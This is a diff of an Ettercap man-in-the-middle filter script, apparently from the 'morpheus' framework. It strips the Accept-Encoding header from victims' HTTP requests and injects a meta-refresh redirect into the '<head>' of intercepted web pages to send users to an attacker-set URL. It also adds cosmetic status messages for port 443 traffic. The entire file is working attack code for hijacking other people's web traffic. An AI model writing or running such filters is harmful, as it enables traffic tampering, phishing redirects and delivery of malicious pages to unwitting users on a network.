@@ -12,30 +12,44 @@
 
 ##
 #  This filter will redirect target requests under mitm
-#  attacks to the specified redirect url. <http-equiv>
+#  attacks to the specified redirect url. [ http-equiv= ]
 ##
+
+
+
+#
+# Report port 443 (tcp) traffic just to make displays
+# that shows to users that filter its working fine ..
+#
+if (ip.proto == TCP && tcp.dst == 443 || tcp.src == 443) {
+    msg("[morpheus] host:modem   [ ⊶  ]  port:443 https ☆");
+}
+
+
 
 
 ##########################
 ## Zap Content Encoding ##
 ##########################
-if (ip.proto == TCP && tcp.dst == 80){
+if (ip.proto == TCP && tcp.dst == 80 || tcp.src == 80){
    if (search(DATA.data, "Accept-Encoding")){
-    replace("Accept-Encoding", "Accept-Rubbish!");
-    msg("[Morpheus] target request Encoding zapped ✔");
+    replace("Accept-Encoding", "Accept-Rubbishh");
+      msg("\n[morpheus] host:request  [ ⊶  ]  found ..");
    }
 }
+
 
 
 #####################
 ## Replace Content ##
 #####################
-if (ip.proto == TCP && tcp.src == 80){
+if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80){
   if (search(DATA.data, "<head>")) {
-   msg("[morpheus] | dns_spoof: %1\n");
-
-    # redirect target to exploitdb by replacing <head> html tag with one redirection url
-    replace("<HEAD>", "<HEAD><META http-equiv='refresh' content='0;URL=IpAdR'>");
-    replace("<head>", "<head><meta http-equiv='refresh' content='0;URL=IpAdR'>");
+      msg("[Morpheus] | action: redirecting target traffic ✔");
+      msg("[Morpheus] |  injec: meta http-equiv on request ✔");
+        # redirect target traffic by replacing <head> html tag with one redirection url
+        replace("<HEAD>", "<HEAD><META http-equiv='refresh' content='0;URL=IpAdR'>");
+        replace("<head>", "<head><meta http-equiv='refresh' content='0;URL=IpAdR'>");
+        msg("[Morpheus] |_ dns_spoof: IpAdR \n");
   }
 }
